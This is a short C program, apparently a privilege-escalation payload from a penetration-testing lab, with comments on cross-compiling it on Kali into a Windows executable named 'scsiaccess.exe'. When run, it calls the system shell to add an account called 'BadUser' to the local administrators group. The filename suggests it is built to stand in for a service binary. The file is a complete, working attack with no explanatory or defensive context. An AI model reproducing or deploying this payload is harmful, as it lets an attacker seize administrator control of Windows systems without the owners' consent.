//On Kali:
//# apt install mingw-w64
//# i686-w64-mingw32-gcc -o scsiaccess.exe useradd.c

#include <stdlib.h>
int main () {
int i;
i=system ("net localgroup administrators BadUser /add");
return 0;
}
